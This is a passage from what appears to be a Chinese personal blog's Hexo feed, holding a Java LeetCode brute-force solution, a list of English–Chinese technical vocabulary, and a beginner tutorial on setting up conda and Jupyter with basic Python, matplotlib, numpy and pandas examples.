class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 19:51 2022/11/3</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * 无重复字符的最长子串</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入: s = &quot;abcabcbb&quot;</span></span><br><span class="line"><span class="comment"> * 输出: 3</span></span><br><span class="line"><span class="comment"> * 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入: s = &quot;bbbbb&quot;</span></span><br><span class="line"><span class="comment"> * 输出: 1</span></span><br><span class="line"><span class="comment"> * 解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入: s = &quot;pwwkew&quot;</span></span><br><span class="line"><span class="comment"> * 输出: 3</span></span><br><span class="line"><span class="comment"> * 解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span></span><br><span class="line"><span class="comment"> * 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 0 &lt;= s.length &lt;= 5 * 104</span></span><br><span class="line"><span class="comment"> * s 由英文字母、数字、符号和空格组成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Aigo_003</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;pwwkew&quot;</span>;</span><br><span class="line">        System.out.println(lengthOfLongestSubstring(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 19:59 2022/11/3</span></span><br><span class="line"><span class="comment">     * Description: 暴力破解,双重循环 contains方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空字符、单个字符情况</span></span><br><span class="line">        <span class="keyword">if</span> (s.length() == <span class="number">0</span> || s.length() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 子串</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">// 最大长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; s.length(); j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j; i &lt; s.length(); i++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 若子串不包含当前字符</span></span><br><span class="line">                <span class="keyword">if</span> (!result.toString().contains(String.valueOf(s.charAt(i)))) &#123;</span><br><span class="line">                    result.append(s.charAt(i));</span><br><span class="line">                    <span class="comment">// 更新子串长度</span></span><br><span class="line">                    <span class="keyword">if</span> (result.length() &gt; maxLength) &#123;</span><br><span class="line">                        maxLength = result.length();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 子串包含当前字符</span></span><br><span class="line">                    <span class="keyword">if</span> (result.length() &gt; maxLength) &#123;</span><br><span class="line">                        maxLength = result.length();</span><br><span class="line">                    &#125;</span><br><span class="line">                    result = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累002</title>
      <link href="/blog/cb3426be.html/"/>
      <url>/blog/cb3426be.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-002"><a href="#Professional-Vocabulary-Accumulation-002" class="headerlink" title="Professional Vocabulary Accumulation_002"></a>Professional Vocabulary Accumulation_002</h1><ul><li><p>Connection to x.x.x.x:5432 refused. </p></li><li><p>拒绝连接到 x.x.x.x:5432。</p></li><li><p>Check that the hostname and port are correct and that the postmaster is accepting TCP&#x2F;IP connections.</p></li><li><p>检查主机和端口是否正确，postmaster 是否接受 TCP&#x2F;IP 连接。</p></li><li><p>The specified substring.</p></li><li><p>指定的子字符串。</p></li><li><p>if beginIndex is negative or larger than the length of this String object.</p></li><li><p>如果开始下标为负数或者大于此字符串对象的长度。</p></li><li><p>Specify the date when the site was setup.</p></li><li><p>指定站点的建站时间。</p></li><li><p>Icon between year and copyright info.</p></li><li><p>年份和版权信息之间的图标。</p></li><li><p>Icon name in Font Awesom.</p></li><li><p>字体中的图标名称很棒。</p></li><li><p>If you want to animate the icon, set it to true.</p></li><li><p>如果你想使得图标有生命力，设置它为 True。</p></li><li><p>Change the color of icon, using Hex Code.</p></li><li><p>使用十六进制代码更改图标的颜色。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境配置及基础实操</title>
      <link href="/blog/47ed95a5.html/"/>
      <url>/blog/47ed95a5.html/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置及基础实操"><a href="#环境配置及基础实操" class="headerlink" title="环境配置及基础实操"></a>环境配置及基础实操</h1><h2 id="一：下载、安装-Python"><a href="#一：下载、安装-Python" class="headerlink" title="一：下载、安装 Python"></a>一：下载、安装 Python</h2><h2 id="二：下载、安装-Anaconda"><a href="#二：下载、安装-Anaconda" class="headerlink" title="二：下载、安装 Anaconda"></a>二：下载、安装 Anaconda</h2><h2 id="三：新建开发环境、安装-Jupyter-notebook"><a href="#三：新建开发环境、安装-Jupyter-notebook" class="headerlink" title="三：新建开发环境、安装 Jupyter notebook"></a>三：新建开发环境、安装 Jupyter notebook</h2><h3 id="新建开发环境"><a href="#新建开发环境" class="headerlink" title="新建开发环境"></a>新建开发环境</h3><ul><li>创建新环境：conda create -n env_name</li><li>激活新环境：conda active env_name</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(base) C:\Users\lenovo&gt;conda create -n imooc_ai</span><br><span class="line">Collecting package metadata (current_repodata.json): <span class="keyword">done</span></span><br><span class="line">Solving environment: <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Package Plan ##</span></span><br><span class="line"></span><br><span class="line">  environment location: Y:\SoftWare\anaconda\Anaconda3\envs\imooc_ai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proceed ([y]/n)? y</span><br><span class="line"></span><br><span class="line">Preparing transaction: <span class="keyword">done</span></span><br><span class="line">Verifying transaction: <span class="keyword">done</span></span><br><span class="line">Executing transaction: <span class="keyword">done</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To activate this environment, use</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     $ conda activate imooc_ai</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To deactivate an active environment, use</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     $ conda deactivate</span></span><br><span class="line"></span><br><span class="line">Retrieving notices: ...working... <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">(base) C:\Users\lenovo&gt;conda activate imooc_ai</span><br></pre></td></tr></table></figure><h2 id="四：Jupyter-notebook-界面优化"><a href="#四：Jupyter-notebook-界面优化" class="headerlink" title="四：Jupyter notebook 界面优化"></a>四：Jupyter notebook 界面优化</h2><p>借助开源项目，对界面进行优化，</p><p>项目地址：<a href="https://github.com/dunovank/jupyter-themes">https://github.com/dunovank/jupyter-themes</a></p><h3 id="Install-with-pip"><a href="#Install-with-pip" class="headerlink" title="Install with pip"></a>Install with pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install jupyterthemes</span></span><br><span class="line">pip install jupyterthemes</span><br><span class="line"></span><br><span class="line"><span class="comment"># upgrade to latest version</span></span><br><span class="line">pip install --upgrade jupyterthemes</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jt -t grade3 -f fira -fs 16 -cellw 90% -ofs 11 -dfs 11 -T</span><br></pre></td></tr></table></figure><h2 id="五：Python-语法实操"><a href="#五：Python-语法实操" class="headerlink" title="五：Python 语法实操"></a>五：Python 语法实操</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 基本语法：基本运算、列表生成、函数、模块引入</span></span><br><span class="line">a = <span class="number">1</span> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a),a)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b = [x+<span class="number">10</span> <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b),b)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt; [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建加法运算函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plusFunction</span>(<span class="params">x1,x2</span>):</span><br><span class="line">    x = x1 + x2</span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = plusFunction(a,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c),c)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; <span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 库模块引入</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">m = random.random()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="number">0.21730372821275368</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]:</span><br><span class="line">    m_i = random.random()</span><br><span class="line">    <span class="built_in">print</span>(m_i)</span><br><span class="line">    </span><br><span class="line"><span class="number">0.22372759310304402</span></span><br><span class="line"><span class="number">0.15114745033159727</span></span><br><span class="line"><span class="number">0.18443572156105592</span></span><br><span class="line"><span class="number">0.8748129421654894</span></span><br><span class="line"><span class="number">0.532564243518567</span></span><br><span class="line"><span class="number">0.27301908385530627</span></span><br><span class="line"><span class="number">0.3783824153668166</span></span><br><span class="line"><span class="number">0.7295293943105771</span></span><br><span class="line"><span class="number">0.1718886842112275</span></span><br><span class="line"><span class="number">0.45445079430510904</span></span><br></pre></td></tr></table></figure><h2 id="六：Matplotlib-实操"><a href="#六：Matplotlib-实操" class="headerlink" title="六：Matplotlib 实操"></a>六：Matplotlib 实操</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line">x = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">y = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">fig1 = plt.figure(figsize=(<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/blog/47ed95a5.html/GitHub\Git-Repository\Ghost-Blog\themes\next\source\images\matplotlib_1.png" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig2 = plt.figure(figsize=(<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line">plt.scatter(x,y)</span><br><span class="line">plt.title(<span class="string">&quot;x vs y&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/blog/47ed95a5.html/GitHub\Git-Repository\Ghost-Blog\themes\next\source\images\matplotlib_2.png" style="zoom:50%;"><h2 id="七：Numpy-实操"><a href="#七：Numpy-实操" class="headerlink" title="七：Numpy 实操"></a>七：Numpy 实操</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.eye(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line">[[<span class="number">1.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">1.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">0.</span> <span class="number">1.</span> <span class="number">0.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">1.</span> <span class="number">0.</span>]</span><br><span class="line"> [<span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">0.</span> <span class="number">1.</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b = np.ones([<span class="number">5</span>,<span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(b.shape)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line">[[<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]]</span><br><span class="line">(<span class="number">5</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c))</span><br><span class="line"><span class="built_in">print</span>(c.shape)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line">(<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">[[<span class="number">2.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">2.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">2.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">2.</span> <span class="number">1.</span>]</span><br><span class="line"> [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">2.</span>]]</span><br></pre></td></tr></table></figure><h2 id="八：Pandas-实操"><a href="#八：Pandas-实操" class="headerlink" title="八：Pandas 实操"></a>八：Pandas 实操</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;Y:\\temp\\data\\date.csv&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(data))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;pandas.core.frame.DataFrame&#x27;</span>&gt;</span><br><span class="line">   x  y</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line"><span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span></span><br><span class="line"><span class="number">3</span>  <span class="number">5</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = data.loc[:,<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x))</span><br><span class="line">y = data.loc[:,<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;pandas.core.series.Series&#x27;</span>&gt;</span><br><span class="line"><span class="number">0</span>    <span class="number">2</span></span><br><span class="line"><span class="number">1</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2</span>    <span class="number">4</span></span><br><span class="line"><span class="number">3</span>    <span class="number">4</span></span><br><span class="line">Name: y, dtype: int64</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = data.loc[:,<span class="string">&#x27;x&#x27;</span>][y&gt;<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>    <span class="number">3</span></span><br><span class="line"><span class="number">3</span>    <span class="number">5</span></span><br><span class="line">Name: x, dtype: int64</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data_array = np.array(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(data_array))</span><br><span class="line"><span class="built_in">print</span>(data_array)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line">[[<span class="number">1</span> <span class="number">2</span>]</span><br><span class="line"> [<span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">3</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">5</span> <span class="number">4</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data_new = data + <span class="number">10</span></span><br><span class="line">data_new.head()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xy</span><br><span class="line"><span class="number">0</span><span class="number">11</span><span class="number">12</span></span><br><span class="line"><span class="number">1</span><span class="number">12</span><span class="number">13</span></span><br><span class="line"><span class="number">2</span><span class="number">13</span><span class="number">14</span></span><br><span class="line"><span class="number">3</span><span class="number">15</span><span class="number">14</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data to csv file </span></span><br><span class="line">data_new.to_csv(<span class="string">&#x27;Y:\\temp\\data\\data.csv&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境及工具包介绍</title>
      <link href="/blog/5d914a79.html/"/>
      <url>/blog/5d914a79.html/</url>
      
